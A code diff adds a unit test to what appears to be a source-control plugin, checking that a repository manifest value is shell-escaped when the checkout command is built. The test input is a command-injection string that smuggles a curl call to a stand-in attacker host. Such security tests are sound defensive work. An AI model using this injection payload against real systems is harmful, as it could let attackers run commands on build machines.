@@ -400,6 +400,17 @@ describe('index', function () {
             });
         });
 
+        it('escapes shell metacharacters in the repo manifest value', () => {
+            config.manifest = `x'; curl http://evil.example/pwn; echo 'x`;
+
+            return scm.getCheckoutCommand(config).then(command => {
+                assert.include(
+                    command.command,
+                    `sd-repo -manifestUrl='x'"'"'; curl http://evil.example/pwn; echo '"'"'x' -sourceRepo=`
+                );
+            });
+        });
+
         it('promises to get the checkout command when rootDir is passed in', () => {
             config.rootDir = 'src/app/component';
 
